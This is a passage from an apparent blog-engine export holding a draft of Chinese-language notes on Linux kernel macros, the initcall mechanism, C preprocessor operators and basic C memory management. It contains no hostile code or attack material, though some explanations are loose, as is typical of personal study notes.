CONFIG_FTRACE_SYSCALLS\n#define SYSCALL_METADATA(sname, nb, ...)\t\t\t\\\n\tstatic const char *types_##sname[] = {\t\t\t\\\n\t\t__MAP(nb,__SC_STR_TDECL,__VA_ARGS__)\t\t\\\n\t};\t\t\t\t\t\t\t\\\n\tstatic const char *args_##sname[] = {\t\t\t\\\n\t\t__MAP(nb,__SC_STR_ADECL,__VA_ARGS__)\t\t\\\n\t};\t\t\t\t\t\t\t\\\n\tSYSCALL_TRACE_ENTER_EVENT(sname);\t\t\t\\\n\tSYSCALL_TRACE_EXIT_EVENT(sname);\t\t\t\\\n\tstatic struct syscall_metadata __used\t\t\t\\\n\t  __syscall_meta_##sname = {\t\t\t\t\\\n\t\t.name \t\t= \"sys\"#sname,\t\t\t\\\n\t\t.syscall_nr\t= -1,\t/* Filled in at boot */\t\\\n\t\t.nb_args \t= nb,\t\t\t\t\\\n\t\t.types\t\t= nb ? types_##sname : NULL,\t\\\n\t\t.args\t\t= nb ? args_##sname : NULL,\t\\\n\t\t.enter_event\t= &event_enter_##sname,\t\t\\\n\t\t.exit_event\t= &event_exit_##sname,\t\t\\\n\t\t.enter_fields\t= LIST_HEAD_INIT(__syscall_meta_##sname.enter_fields), \\\n\t};\t\t\t\t\t\t\t\\\n\tstatic struct syscall_metadata __used\t\t\t\\\n\t  __section(\"__syscalls_metadata\")\t\t\t\\\n\t *__p_syscall_meta_##sname = &__syscall_meta_##sname;\n\nstatic inline int is_syscall_trace_event(struct trace_event_call *tp_event)\n{\n\treturn tp_event->class == &event_class_syscall_enter ||\n\t       tp_event->class == &event_class_syscall_exit;\n}\n#else\n#define SYSCALL_METADATA(sname, nb, ...)\n\nstatic inline int is_syscall_trace_event(struct trace_event_call *tp_event)\n{\n\treturn 0;\n}\n#endif\n\n#ifend\n\n```\nif you define CONFIG_FTRACE_SYSCALLS in kconfig file,it will exe \"ifdefine\" block else it will exe \"else\" block. \n\n在C语言的宏定义中，## 操作符被称为“粘合”或“连接”操作符（token-pasting operator）。它的作用是将两个令牌（token）连接成一个新的令牌。这在宏定义和宏展开时非常有用，可以动态生成新的标识符或变量名。\n\n让我们详细解释一下：\n\n使用 ## 的例子\n考虑以下宏定义：\n```#define CONCAT(a, b) a##b```\n如果我们使用这个宏：\n```CONCAT(foo, bar)```\n这将被预处理器展开为：\n```foobar```\n\n在C语言的宏定义中，# 操作符被称为字符串化操作符（stringizing operator）。它的作用是将宏参数转换为字符串字面量。这在宏定义和预处理过程中非常有用，尤其是在需要生成字符串的情况下。\n\n解释 # 操作符\n让我们详细解释一下 # 操作符的使用：\n\n字符串化操作符：\n\n```#define TO_STRING(x) #x```\n这个宏 TO_STRING 将参数 x 转换为字符串字面量。例如：\n\n```TO_STRING(hello)```\n这将被预处理器展开为：\n\n\n```\"hello\"```\n在 SYSCALL_METADATA 宏中的使用：\n\n```.name = \"sys\"#sname,``\n这里的 #sname 将 sname 宏参数转换为字符串字面量，并与 \"sys\" 连接在一起。\n字符串强化\n\n```c\nextern asmlinkage void __init __noreturn start_kernel(void);\n```\n这行代码声明了一个函数 start_kernel，其中包含了多个关键字和修饰符。每个关键字都有特定的含义和作用。下面我们逐个详细解释每个关键词的含义及其在这段代码中的用途：\n\nextern asmlinkage void __init __noreturn start_kernel(void);\n\n1. extern\n\n\t•\t含义：extern 关键字表示 start_kernel 是一个外部函数，即它在其他文件中定义，而非在当前文件中实现。\n\t•\t作用：在多个源文件之间共享函数或变量时，extern 用于告诉编译器该函数的定义在别的文件中。这避免了重复定义的问题，并允许链接器在其他文件中找到函数的实际定义。\n\n在这段代码中，extern 表示 start_kernel 函数的定义位于其他源文件中。\n\n2. asmlinkage\n\n\t•\t含义：asmlinkage 是一个宏，用于指定函数的参数传递方式。它告诉编译器，函数的参数应从 堆栈 而不是 寄存器 中传递。\n\t•\t作用：asmlinkage 在 Linux 内核中常用于定义一些系统调用函数，使得它们可以按照固定的方式接收参数，从而符合调用约定。通过 asmlinkage，内核可以在不同的体系架构上保持一致的参数传递方式，特别是在 x86 和其他架构中。\n\n在 ARM64 中，asmlinkage 会影响函数调用的 ABI（应用程序二进制接口），通常用于系统调用和某些特殊的内核函数，以确保调用者在调用函数时符合规定的参数传递方式。\n\n3. void\n\n\t•\t含义：void 表示 start_kernel 函数没有返回值。\n\t•\t作用：这表明 start_kernel 函数执行后不会向调用者返回任何值。\n\n这是 C 语言中用于声明函数返回值类型的标准关键字。void 返回类型常见于执行一系列操作后无需返回结果的函数。\n\n4. __init\n\n\t•\t含义：__init 是一个内核特定的宏，用于标识只在初始化阶段使用的函数或数据。\n\t•\t作用：在 Linux 内核中，__init 修饰的函数或数据会放入专门的 .init 段（section）。在系统启动完成后，这段内存会被释放，以节省内存资源。\n\n标记为 __init 的函数或数据会在初始化完成后被内核自动丢弃，因此仅在初始化期间有效。在 start_kernel 中使用 __init 表示它是一个只在系统启动时调用的初始化函数。\n\n5. __noreturn\n\n\t•\t含义：__noreturn 是一个函数属性，用来告诉编译器该函数不会返回到调用者。\n\t•\t作用：编译器使用 __noreturn 来优化代码和发出警告。如果一个标记了 __noreturn 的函数尝试返回，编译器会给出警告。\n\n在内核中，__noreturn 表示函数会在执行过程中进入无限循环或在某种情况下导致系统重启、关机等操作，因此永远不会返回。\n\n6. start_kernel(void)\n\n\t•\tstart_kernel：这是函数的名称，表示该函数是内核启动过程中的主入口点。start_kernel 是 Linux 内核的核心初始化函数，负责从系统启动到内核完全初始化的过渡。\n\t•\t(void)：表示该函数不接受任何参数。\n\n综合解释\n\n这行代码声明了一个外部函数 start_kernel，它具有以下特性：\n\n\t•\t定义在其他源文件中；\n\t•\t参数从堆栈传递；\n\t•\t不返回任何值；\n\t•\t仅在内核初始化阶段有效，之后会被释放；\n\t•\t不会返回给调用者（即它是一个无限循环或最终会导致系统不再执行任何其他代码的函数）；\n\n整体含义\n\nstart_kernel 是内核初始化的入口函数之一，负责从引导加载程序过渡到完全初始化的操作系统内核。它在初始化完成后不再需要，因此标记为 __init。因为这个函数在启动后不会再返回，标记为 __noreturn。","source":"_drafts/c.md","raw":"### 宏定义\n\n\n#### __init:\n`#define __init\t\t__section(\".init.text\") __cold  __latent_entropy __noinitretpoline __nocfi `\n\n__section(\".init.text\")：\n\n这个指令将函数放置在输出可执行文件的特定段中，本例中为“.init.text”段。这个段通常用于系统启动时需要的初始化程序，初始化完成后可以丢弃，以节省内存。\n__cold：\n\n这个属性告诉编译器，该函数不太可能经常执行。这可以帮助编译器优化代码以提高性能，可能通过安排函数的方式来减少其在不经常使用时对指令缓存性能的影响。\n__latent_entropy：\n\n这个属性用于增加系统的熵（随机性），这在安全方面特别有用，例如，使依赖于可预测执行模式的攻击更加困难。\n__noinitretpoline：\n\n这个属性表明该函数不需要retpoline（返回跳板），这是一种针对某些类型的投机执行侧通道攻击（如Spectre）的缓解技术。\n__nocfi：\n\n这个指令告诉编译器不对这个函数应用控制流完整性（CFI）检查。控制流完整性是一种安全特性，通过确保间接函数调用转到有效函数来帮助防止某些类型的攻击。对于某些低级函数，跳过CFI可能是必要的，因为CFI的开销或限制可能会干扰函数的操作。\n\n#### 从device_initcall查看宏定义\ndevice_initcall(binder_init)就是将指向binder_init的函数指针，注册在.initcall6.init段里。内核启动时，会调用它，对Binder驱动进行初始化。\n```\ntypedef int (*initcall_t)(void);\ntypedef initcall_t initcall_entry_t;\n\n/* Format: <modname>__<counter>_<line>_<fn> */\n#define __initcall_id(fn)\t\t\t\t\t\\\n\t__PASTE(__KBUILD_MODNAME,\t\t\t\t\\\n\t__PASTE(__,\t\t\t\t\t\t\\\n\t__PASTE(__COUNTER__,\t\t\t\t\t\\\n\t__PASTE(_,\t\t\t\t\t\t\\\n\t__PASTE(__LINE__,\t\t\t\t\t\\\n\t__PASTE(_, fn))))))\n\n/* Format: __<prefix>__<iid><id> */\n#define __initcall_name(prefix, __iid, id)\t\t\t\\\n\t__PASTE(__,\t\t\t\t\t\t\\\n\t__PASTE(prefix,\t\t\t\t\t\t\\\n\t__PASTE(__,\t\t\t\t\t\t\\\n\t__PASTE(__iid, id))))\n      \n#define __initcall_section(__sec, __iid)\t\t\t\\\n\t#__sec \".init\"\n\n#define __initcall_stub(fn, __iid, id)\tfn\n\n#define ____define_initcall(fn, __unused, __name, __sec)\t\\\n\tstatic initcall_t __name __used \t\t\t\\\n\t\t__attribute__((__section__(__sec))) = fn;\n#endif\n\n#define __unique_initcall(fn, id, __sec, __iid)\t\t\t\\\n\t____define_initcall(fn,\t\t\t\t\t\\\n\t\t__initcall_stub(fn, __iid, id),\t\t\t\\\n\t\t__initcall_name(initcall, __iid, id),\t\t\\\n\t\t__initcall_section(__sec, __iid))\n\n#define ___define_initcall(fn, id, __sec)\t\t\t\\\n\t__unique_initcall(fn, id, __sec, __initcall_id(fn))\n\n#define __define_initcall(fn, id) ___define_initcall(fn, id, .initcall##id)\n\n#define device_initcall(fn)\t\t__define_initcall(fn, 6)\n```\n\ndevice_initcall(binder_init)展开就是：\n```\ndevice_initcall(binder_init)\n        ↓\n__define_initcall(binder_init, 6)\n        ↓\n___define_initcall(binder_init, 6, .initcall6)\n        ↓\n__unique_initcall(binder_init, 6, .initcall6, <modname>__<counter>_<line>_binder_init)\n        ↓\n____define_initcall(binder_init, \n        binder_init,\n        __initcall__<modname>__<counter>_<line>_binder_init6,\n        .initcall6.init)\n        ↓\nstatic initcall_t __initcall__<modname>__<counter>_<line>_binder_init6 __used \n      __attribute__((__section__(.initcall6.init))) = binder_init;\n```\n\n##### \\_\\_initcall_id\n这段代码定义了一个宏 __initcall_id(fn)，其目的是生成一个唯一的标识符，用于内核初始化函数（initcall）。这个宏通过多层嵌套的 __PASTE 宏，将几个预处理器变量和函数名结合成一个连续的字符串。下面是对这个宏的详细解释：\n\n*组件解释*\n* \\_\\_KBUILD_MODNAME：\n这是一个由内核构建系统定义的宏，它表示正在编译的模块的名称。如果代码不是为模块编译的，它通常是内核的名称或为空。\n* \\_\\_COUNTER\\_\\_：\n这是一个特殊的预处理器变量，每次出现在源代码中时都会递增。\\_\\_COUNTER__ 用于在编译过程中生成唯一的序列号，确保每次宏展开时都得到一个不同的值。是GNU 编译器的非标准编译器扩展，可以认为它是一个计数器，代表一个整数，它的值一般被初始化为0，在每次编译器编译到它时，会自动 +1。\n* \\_\\_LINE\\_\\_：\n这个宏展开为当前代码行的行号。它在源代码中是唯一的，除非多个宏展开发生在同一行。\n* fn：\n这是宏的参数，表示将要注册的初始化函数的名字。\n* __PASTE 宏\n__PASTE 宏的目的是将两个参数连接在一起（没有空格）。__initcall_id 宏通过多次使用 __PASTE，将上述元素拼接成一个单一的、唯一的标识符。这种连续使用 __PASTE 的方式确保了不同部分之间没有空格，并且生成的字符串是平滑连续的。\n\n*完整的宏展开过程*\n    如果我们假设：\n    \\_\\_KBUILD_MODNAME 是 \"mykernelmodule\"\n    \\_\\_COUNTER\\_\\_ 当前是 42\n    \\_\\_LINE\\_\\_ 是 123\n    fn 是 init_my_device\n宏展开的结果将是：`mykernelmodule__42_123_init_my_device`\n这个结果是由以下步骤生成的：\n1. 首先连接 mykernelmodule 和 _，结果是 mykernelmodule__。\n2. 然后连接前面的结果和 42，得到 mykernelmodule__42。\n3. 接着连接 _ 和 123，再和前面的结果连接，得到 mykernelmodule__42_123。\n4. 最后将 init_my_device 通过 _ 连接上去，得到最终的字符串 mykernelmodule__42_123_init_my_device。\n\n```\n#define __initcall_section(__sec, __iid)\t\t\t\\\n\t#__sec \".init\"\n这个宏 __initcall_section(__sec, __iid) 定义了一个用于生成内核初始化代码段名的格式。宏的工作是把传入的 __sec 和字符串 .init 拼接起来，构成一个用于特定初始化函数的ELF段（section）名称。这里，__iid 参数虽然在宏定义中出现，但在实际的字符串连接操作中没有被使用，可能是为了保持与其他相关宏的参数格式一致性，或为未来的扩展预留。\n```\n详细解释：\n* #__sec：\n这部分使用了字符串化操作符 #，它会将宏参数转化为一个字符串。这意味着传入的宏参数 __sec 会被转换成一个字面量字符串。\n* \".init\"：\n这是一个直接的字符串常量，表示初始化段的后缀。在Linux内核中，用于初始化代码的段通常以 .init 结尾，比如 .init.text、.init.data 等。\n拼接：\n\n宏中没有明显的连接操作（如 ## 运算符），但在宏的用法中，这两部分（#__sec 和 \".init\"）通过宏替换自然连接成一个完整的字符串。\n使用例子：\n假设有如下调用：\n\n__initcall_section(my_section, 123)\n根据宏的定义，这将展开为：\n\n\"my_section.init\"\n这里，my_section 被字符串化并与 .init 后缀连接，生成一个新的字符串，表示一个内核ELF段的名称。\n\n#### initcall机制\n当我们试图将一个驱动程序加载进内核时，我们需要提供一个`xxx_init()`函数。这样内核才会定位到该函数，加载驱动，初始化驱动。\n`binder_init()`就是这样一个初始化驱动的函数。但是怎么向内核注册这样一个函数呢？直观的做法是维护一个初始化驱动的函数指针的数组，将`binder_init()`添加进该数组中。不过这样在多人开发时，容易造成编码冲突。\nlinux采用了更优雅的方法——initcall机制：\n在内核镜像文件中，自定义一个段，这个段里面专门用来存放这些初始化函数的地址，内核启动时，只需要在这个段地址处取出函数指针，一个个执行即可。\n##### .initcallXX.init段\n`.initcallXX.init`段就是专门用来存放各个内核模块的初始化函数的地址。\n\n`device_initcall(fn)`就是表示将指向fn的函数指针，存放在`.initcall6.init`段。类似的宏定义有：\n```\n#define pure_initcall(fn)\t\t__define_initcall(fn, 0)              →  .initcall0.init\n#define core_initcall(fn)\t\t__define_initcall(fn, 1)              →  .initcall1.init\n#define core_initcall_sync(fn)\t\t__define_initcall(fn, 1s)             →  .initcall1s.init\n#define postcore_initcall(fn)\t\t__define_initcall(fn, 2)              →  .initcall2.init\n#define postcore_initcall_sync(fn)\t__define_initcall(fn, 2s)             →  .initcall2s.init\n#define arch_initcall(fn)\t\t__define_initcall(fn, 3)              →  .initcall3.init\n#define arch_initcall_sync(fn)\t\t__define_initcall(fn, 3s)             →  .initcall3s.init\n#define subsys_initcall(fn)\t\t__define_initcall(fn, 4)              →  .initcall4.init\n#define subsys_initcall_sync(fn)\t__define_initcall(fn, 4s)             →  .initcall4s.init\n#define fs_initcall(fn)\t\t\t__define_initcall(fn, 5)              →  .initcall5.init\n#define fs_initcall_sync(fn)\t\t__define_initcall(fn, 5s)             →  .initcall5s.init\n#define rootfs_initcall(fn)\t\t__define_initcall(fn, rootfs)         →  .initcallrootfs.init\n#define device_initcall(fn)\t\t__define_initcall(fn, 6)              →  .initcall6.init\n#define device_initcall_sync(fn)\t__define_initcall(fn, 6s)             →  .initcall6s.init\n#define late_initcall(fn)\t\t__define_initcall(fn, 7)              →  .initcall7.init\n#define late_initcall_sync(fn)\t\t__define_initcall(fn, 7s)             →  .initcall7s.init\n```\n\n#### .initcallXX.init段的定义\n.initcallXX.init段的定义是在common/include/asm-generic/vmlinux.lds.h和common/arch/arm64/kernel/vmlinux.lds.S中。\n```\n//common/include/asm-generic/vmlinux.lds.h\n#define INIT_CALLS_LEVEL(level)\t\t\t\t\t\t\\\n\t\t__initcall##level##_start = .;\t\t\t\t\\\n\t\tKEEP(*(.initcall##level##.init))\t\t\t\\\n\t\tKEEP(*(.initcall##level##s.init))\t\t\t\\\n\n#define INIT_CALLS\t\t\t\t\t\t\t\\\n\t\t__initcall_start = .;\t\t\t\t\t\\\n\t\tKEEP(*(.initcallearly.init))\t\t\t\t\\\n\t\tINIT_CALLS_LEVEL(0)\t\t\t\t\t\\\n\t\tINIT_CALLS_LEVEL(1)\t\t\t\t\t\\\n\t\tINIT_CALLS_LEVEL(2)\t\t\t\t\t\\\n\t\tINIT_CALLS_LEVEL(3)\t\t\t\t\t\\\n\t\tINIT_CALLS_LEVEL(4)\t\t\t\t\t\\\n\t\tINIT_CALLS_LEVEL(5)\t\t\t\t\t\\\n\t\tINIT_CALLS_LEVEL(rootfs)\t\t\t\t\\\n\t\tINIT_CALLS_LEVEL(6)\t\t\t\t\t\\\n\t\tINIT_CALLS_LEVEL(7)\t\t\t\t\t\\\n\t\t__initcall_end = .;\n                \n//common/arch/arm64/kernel/vmlinux.lds.S\nSECTIONS\n{\n        ...\n        .init.data : {\n\t\tINIT_DATA\n\t\tINIT_SETUP(16)\n\t\tINIT_CALLS\n\t\tCON_INITCALL\n\t\tINIT_RAM_FS\n\t\t*(.init.altinstructions .init.bss)\t/* from the EFI stub */\n\t}\n        ...\n}\n```\n参考：https://www.cnblogs.com/jianhua1992/p/16852793.html\n解释：\n* *() \n在链接器脚本中确实用作通配符。在链接器脚本的语法中，*() 用于匹配符合特定模式的所有符号或者段(section)。这种用法允许链接器指令应用于多个相关的符号或段，而不需要单独列举它们。这是组织和控制链接输出文件的一个强大特性，特别是在操作系统内核或其他复杂软件系统的构建中。\n\nKEEP(*(.initcall##level##.init)) 和 KEEP(*(.initcall##level##s.init)) 使用了通配符 * 来包含所有在特定命名模式的段中的符号。这里的通配符 * 表示匹配所有符号，而括号内的表达式定义了要匹配的段名。例如：\n\n.initcall0.init\n.initcall1.init\n.initcall0s.init\n.initcall1s.init\n\n*(.initcall##level##.init)：\n\n这表示匹配所有在 .initcall<level>.init 段中的符号。例如，如果 level 是 0，则匹配 .initcall0.init 段中的所有符号。\n*(.initcall##level##s.init)：\n\n类似地，这表示匹配所有在 .initcall<level>s.init 段中的符号。这个 s 后缀可能代表某种特定类型的初始化调用，如同步初始化调用。\n为什么使用 KEEP\nKEEP 指令在链接器脚本中用来确保即使没有被程序的其他部分直接引用，也不会被链接器优化掉（即不被删除）。这对于初始化代码特别重要，因为这些代码在执行完毕后通常不会再被其他运行时代码直接引用，但它们在系统启动阶段是必需的。通过使用 KEEP，可以保证这些重要的初始化段不会因为“看似”未被使用而被剔除，确保内核能够按预期顺序执行这些初始化步骤。\n\n这种机制是内核和其他底层系统软件能够精确控制初始化过程的关键，特别是在涉及到内存和资源优化的上下文中。\n\n* ##在宏定义中的作用是将多个符号连接成一个符号，并不将其字符串化\n\n### 标号元素\n```\nstatic const struct file_operations __maybe_unused kmem_fops = {\n    .llseek     = memory_lseek,\n    .read       = read_kmem,\n    .write      = write_kmem,\n    .mmap       = mmap_kmem,\n    .open       = open_kmem,\n#ifndef CONFIG_MMU\n    .get_unmapped_area = get_unmapped_area_mem,\n    .mmap_capabilities = memory_mmap_capabilities,\n#endif\n};\n```\n#### 解释\n1. 结构体声明与类型\nstruct file_operations：这是一个预定义的结构体类型，通常在Linux内核源代码中定义，用于描述文件操作相关的函数指针。\n2. 修饰符和存储类\nstatic：表示这个结构体变量 kmem_fops 的作用域限制在定义它的文件内，外部文件不能访问它。\nconst：表示这个结构体变量是常量，一旦初始化后，其内容不应被修改。\n__maybe_unused：这是一个编译器指示，用于告诉编译器这个变量可能在代码中未被使用，这可以避免编译器发出未使用变量的警告。这通常用在可能因为不同的编译配置而使用或不使用的变量上。\n3. 结构体成员初始化\n.llseek = memory_lseek，.read = read_kmem，等：这种使用点（.）后跟成员名的初始化方式是C99标准中引入的指定初始化器（designated initializer）。它允许在初始化结构体时直接指定每个成员的值，而不需要依赖于成员在结构体中的顺序。\n4. 条件编译\n#ifndef CONFIG_MMU ... #endif：这是预处理指令，用于条件编译。它检查 CONFIG_MMU 是否未被定义。如果未定义 CONFIG_MMU，则编译器会编译这两行代码：\n.get_unmapped_area = get_unmapped_area_mem\n.mmap_capabilities = memory_mmap_capabilities\n这通常在不同的硬件配置或内核配置选项下使用，以适应不同的系统需求。\n\n当在内核模块中将 memory_lseek 函数指定给 file_operations 结构体的 .llseek 成员时，任何针对该设备文件的 lseek 系统调用最终都会调用你的 memory_lseek 函数。\n#### 使用\n这里是详细的调用流程：\n\n用户空间调用：当用户空间的程序调用 lseek() 函数时，这个调用最初由标准C库（例如glibc）封装，该库将系统调用参数封装为适当的系统调用请求。\n系统调用转换：系统调用接口在内核中接收到这个请求后，会找到与文件描述符关联的 file 结构体实例。\n文件操作结构体：每个打开的文件在内核中都有一个与之关联的 file 结构体，这个结构体包含了指向 file_operations 结构体的指针。file_operations 结构体为各种文件操作定义了具体的函数指针，如打开、读取、写入、定位等。\n调用 .llseek：如果对应的 file_operations 结构体中的 .llseek 成员被设置为 memory_lseek，那么内核就会调用 memory_lseek 函数来处理这个定位请求。\n执行定位操作：memory_lseek 函数将根据提供的参数（文件指针、偏移量和起始位置标志）计算新的文件位置，并将这个新位置返回给调用者。如果操作有效，返回的就是新的文件偏移量；如果无效（如偏移量无效或操作不被支持），则返回错误码。\n\n\nc语言结构体大小计算规则：\n1、结构体变量的首地址，必须是结构体变量中的“最大基本数据类型成员所占字节数”的整数倍。（对齐）\n2、结构体变量中的每个成员相对于结构体首地址的偏移量，都是该成员基本数据类型所占字节的整数倍。（对齐）\n3、结构体变量的总大小，为结构体变量中“最大基本数据类型成员所占字节数”的整数倍（补齐）\n\n--\ntypedef struct Work_{\n    int num;\n\n}Work_;\n\n如果不对自己起别名，直接用\nWork_ work=new Work_(); 会报错，必须用 struct Work_ work=new Work_();\n--\n\nc:内存申请\n\n栈：占最大内存中的2M,开辟内存的方式是静态内存开辟，比如：函数内声明变量，函数方法结束后会自动回收\n堆：占最大内存中的80%，动态内存开辟，不会自动回收,必须手动回收。malloc()开辟，free()释放\n\n利用realloc扩展内存，如果原来的内存不足以向下扩展，会重新找一块足够的内存，因此，指针指向的地址会变动。\n动态申请内存时有可能会失败，所以会返回null,如果是扩展内存返回null,那么需要把malloc的内存释放掉\n释放时，也务必进行空指针判断，释放完最好把指针置空\n'''\n//动态开辟内存\nvoid dyMemoryTest(int num,int newNum){\n    int* arrPoint= (int*)malloc(10*1024*1024*sizeof(int)); //40M\n\n    //必须手动释放\n    if(arrPoint){\n        free(arrPoint);  \n    }\n    int* arrPoint2=(int*)malloc(num*sizeof(int));\n    if(arrPoint2){\n        for(int i=0;i<num;i++){\n            *(arrPoint2+i)=i;\n        }\n    }\n    int* arrPoint3 =(int *)realloc(arrPoint2,(num+newNum)*sizeof(int));\n    if(arrPoint3){\n        for(int i=num;i<num+newNum;i++){\n            *(arrPoint3+i)=i;\n        }\n        for(int i=0;i<num+newNum;i++){\n            LOGD(\"the number is %d ,the value is %d\",i,*(arrPoint3+i));\n        }\n        //成功了，只释放旧指针就行\n        free(arrPoint3);\n        arrPoint3= nullptr;\n    }else{\n        //没有成功，释放旧指针\n        if(arrPoint2){\n            free(arrPoint2);\n        }\n    }\n}\n'''\n\nlinux config example:\n\nCONFIG_FTRACE_SYSCALLS 是一个内核配置选项，用于控制是否启用系统调用的函数追踪（ftrace）功能.\n\nlinux/syscalls.h\n```\n#ifdef CONFIG_FTRACE_SYSCALLS\n#define SYSCALL_METADATA(sname, nb, ...)\t\t\t\\\n\tstatic const char *types_##sname[] = {\t\t\t\\\n\t\t__MAP(nb,__SC_STR_TDECL,__VA_ARGS__)\t\t\\\n\t};\t\t\t\t\t\t\t\\\n\tstatic const char *args_##sname[] = {\t\t\t\\\n\t\t__MAP(nb,__SC_STR_ADECL,__VA_ARGS__)\t\t\\\n\t};\t\t\t\t\t\t\t\\\n\tSYSCALL_TRACE_ENTER_EVENT(sname);\t\t\t\\\n\tSYSCALL_TRACE_EXIT_EVENT(sname);\t\t\t\\\n\tstatic struct syscall_metadata __used\t\t\t\\\n\t  __syscall_meta_##sname = {\t\t\t\t\\\n\t\t.name \t\t= \"sys\"#sname,\t\t\t\\\n\t\t.syscall_nr\t= -1,\t/* Filled in at boot */\t\\\n\t\t.nb_args \t= nb,\t\t\t\t\\\n\t\t.types\t\t= nb ? types_##sname : NULL,\t\\\n\t\t.args\t\t= nb ? args_##sname : NULL,\t\\\n\t\t.enter_event\t= &event_enter_##sname,\t\t\\\n\t\t.exit_event\t= &event_exit_##sname,\t\t\\\n\t\t.enter_fields\t= LIST_HEAD_INIT(__syscall_meta_##sname.enter_fields), \\\n\t};\t\t\t\t\t\t\t\\\n\tstatic struct syscall_metadata __used\t\t\t\\\n\t  __section(\"__syscalls_metadata\")\t\t\t\\\n\t *__p_syscall_meta_##sname = &__syscall_meta_##sname;\n\nstatic inline int is_syscall_trace_event(struct trace_event_call *tp_event)\n{\n\treturn tp_event->class == &event_class_syscall_enter ||\n\t       tp_event->class == &event_class_syscall_exit;\n}\n#else\n#define SYSCALL_METADATA(sname, nb, ...)\n\nstatic inline int is_syscall_trace_event(struct trace_event_call *tp_event)\n{\n\treturn 0;\n}\n#endif\n\n#ifend\n\n```\nif you define CONFIG_FTRACE_SYSCALLS in kconfig file,it will exe \"ifdefine\" block else it will exe \"else\" block. \n\n在C语言的宏定义中，## 操作符被称为“粘合”或“连接”操作符（token-pasting operator）。它的作用是将两个令牌（token）连接成一个新的令牌。这在宏定义和宏展开时非常有用，可以动态生成新的标识符或变量名。\n\n让我们详细解释一下：\n\n使用 ## 的例子\n考虑以下宏定义：\n```#define CONCAT(a, b) a##b```\n如果我们使用这个宏：\n```CONCAT(foo, bar)```\n这将被预处理器展开为：\n```foobar```\n\n在C语言的宏定义中，# 操作符被称为字符串化操作符（stringizing operator）。它的作用是将宏参数转换为字符串字面量。这在宏定义和预处理过程中非常有用，尤其是在需要生成字符串的情况下。\n\n解释 # 操作符\n让我们详细解释一下 # 操作符的使用：\n\n字符串化操作符：\n\n```#define TO_STRING(x) #x```\n这个宏 TO_STRING 将参数 x 转换为字符串字面量。例如：\n\n```TO_STRING(hello)```\n这将被预处理器展开为：\n\n\n```\"hello\"```\n在 SYSCALL_METADATA 宏中的使用：\n\n```.name = \"sys\"#sname,``\n这里的 #sname 将 sname 宏参数转换为字符串字面量，并与 \"sys\" 连接在一起。\n字符串强化\n\n```c\nextern asmlinkage void __init __noreturn start_kernel(void);\n```\n这行代码声明了一个函数 start_kernel，其中包含了多个关键字和修饰符。每个关键字都有特定的含义和作用。下面我们逐个详细解释每个关键词的含义及其在这段代码中的用途：\n\nextern asmlinkage void __init __noreturn start_kernel(void);\n\n1. extern\n\n\t•\t含义：extern 关键字表示 start_kernel 是一个外部函数，即它在其他文件中定义，而非在当前文件中实现。\n\t•\t作用：在多个源文件之间共享函数或变量时，extern 用于告诉编译器该函数的定义在别的文件中。这避免了重复定义的问题，并允许链接器在其他文件中找到函数的实际定义。\n\n在这段代码中，extern 表示 start_kernel 函数的定义位于其他源文件中。\n\n2. asmlinkage\n\n\t•\t含义：asmlinkage 是一个宏，用于指定函数的参数传递方式。它告诉编译器，函数的参数应从 堆栈 而不是 寄存器 中传递。\n\t•\t作用：asmlinkage 在 Linux 内核中常用于定义一些系统调用函数，使得它们可以按照固定的方式接收参数，从而符合调用约定。通过 asmlinkage，内核可以在不同的体系架构上保持一致的参数传递方式，特别是在 x86 和其他架构中。\n\n在 ARM64 中，asmlinkage 会影响函数调用的 ABI（应用程序二进制接口），通常用于系统调用和某些特殊的内核函数，以确保调用者在调用函数时符合规定的参数传递方式。\n\n3. void\n\n\t•\t含义：void 表示 start_kernel 函数没有返回值。\n\t•\t作用：这表明 start_kernel 函数执行后不会向调用者返回任何值。\n\n这是 C 语言中用于声明函数返回值类型的标准关键字。void 返回类型常见于执行一系列操作后无需返回结果的函数。\n\n4. __init\n\n\t•\t含义：__init 是一个内核特定的宏，用于标识只在初始化阶段使用的函数或数据。\n\t•\t作用：在 Linux 内核中，__init 修饰的函数或数据会放入专门的 .init 段（section）。在系统启动完成后，这段内存会被释放，以节省内存资源。\n\n标记为 __init 的函数或数据会在初始化完成后被内核自动丢弃，因此仅在初始化期间有效。在 start_kernel 中使用 __init 表示它是一个只在系统启动时调用的初始化函数。\n\n5. __noreturn\n\n\t•\t含义：__noreturn 是一个函数属性，用来告诉编译器该函数不会返回到调用者。\n\t•\t作用：编译器使用 __noreturn 来优化代码和发出警告。如果一个标记了 __noreturn 的函数尝试返回，编译器会给出警告。\n\n在内核中，__noreturn 表示函数会在执行过程中进入无限循环或在某种情况下导致系统重启、关机等操作，因此永远不会返回。\n\n6. start_kernel(void)\n\n\t•\tstart_kernel：这是函数的名称，表示该函数是内核启动过程中的主入口点。start_kernel 是 Linux 内核的核心初始化函数，负责从系统启动到内核完全初始化的过渡。\n\t•\t(void)：表示该函数不接受任何参数。\n\n综合解释\n\n这行代码声明了一个外部函数 start_kernel，它具有以下特性：\n\n\t•\t定义在其他源文件中；\n\t•\t参数从堆栈传递；\n\t•\t不返回任何值；\n\t•\t仅在内核初始化阶段有效，之后会被释放；\n\t•\t不会返回给调用者（即它是一个无限循环或最终会导致系统不再执行任何其他代码的函数）；\n\n整体含义\n\nstart_kernel 是内核初始化的入口函数之一，负责从引导加载程序过渡到完全初始化的操作系统内核。它在初始化完成后不再需要，因此标记为 __init。因为这个函数在启动后不会再返回，标记为 __noreturn。","slug":"c","published":0,"date":"2024-04-17T07:33:02.844Z","updated":"2024-11-04T09:42:00.817Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cmd44risz000cv8fyewazhtjz","content":"<h3 id=\"宏定义\"><a href=\"#宏定义\" class=\"headerlink\" title=\"宏定义\"></a>宏定义</h3><h4 id=\"init\"><a href=\"#init\" class=\"headerlink\" title=\"__init:\"></a>__init:</h4><p><code>#define __init        __section(&quot;.init.text&quot;) __cold  __latent_entropy __noinitretpoline __nocfi 